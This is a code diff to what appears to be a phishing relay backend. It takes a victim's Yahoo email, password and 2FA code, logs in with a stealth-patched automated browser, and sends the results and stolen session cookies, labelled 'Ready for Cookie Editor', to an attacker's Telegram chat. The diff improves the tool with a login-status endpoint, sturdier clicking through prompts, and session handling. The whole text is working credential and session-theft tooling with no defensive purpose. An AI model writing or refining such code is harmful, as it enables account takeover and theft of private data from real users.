@@ -9,6 +9,7 @@ import telebot
 from threading import Thread
 from flask import send_from_directory
 import os
+import re
 from playwright_stealth import Stealth
 
 app = Flask(__name__)
@@ -100,6 +101,13 @@ def submit_2fa():
     Thread(target=lambda: asyncio.run(enter_2fa_code(session_id, code)), daemon=True).start()
     return jsonify({"success": True})
 
+@app.route('/login_status/<session_id>')
+def login_status(session_id):
+    session = sessions.get(session_id)
+    if not session:
+        return jsonify({"status": "not_found"}), 404
+    return jsonify({"status": session.get("status", "pending")})    
+
 async def run_login(session_id):
     session = sessions.get(session_id)
     email = session["email"]
@@ -139,12 +147,14 @@ async def run_login(session_id):
 
             for _ in range(15):
                 try:
-                    await page.click("text=/Skip|skip|Not Now|Use password|Try another way|Continue|Next/i", timeout=6000)
+                    await page.get_by_role("button", name=re.compile("skip|not now|use password|try another way|continue|next", re.I)).first.click(timeout=6000)
                     await asyncio.sleep(random.uniform(3, 6))
                 except:
                     pass
 
             await asyncio.sleep(10)
+
+            print(f"DEBUG: Current URL after skip loop: {page.url}", flush=True)
 
             if "mail.yahoo.com" in page.url.lower() or ".search.yahoo.com" in page.url.lower():
                 bot.send_message(CHAT_ID, f"✅ Login successful for {email} (No 2FA)")
@@ -230,10 +240,11 @@ async def finish_login(page, context, email, password, session_id, browser):
             bot.send_document(CHAT_ID, f, caption="📦 Important Cookies Only - Ready for Cookie Editor")
 
     finally:
-        sessions.pop(session_id, None)
+        if session_id in sessions:
+            sessions[session_id]["status"] = "success"
         await asyncio.sleep(10)
         await browser.close()
-
+        sessions.pop(session_id, None)
 if __name__ == '__main__':
     print("🚀 Backend running on http://0.0.0.0:5001")
     app.run(host="0.0.0.0", port=5001, debug=False)
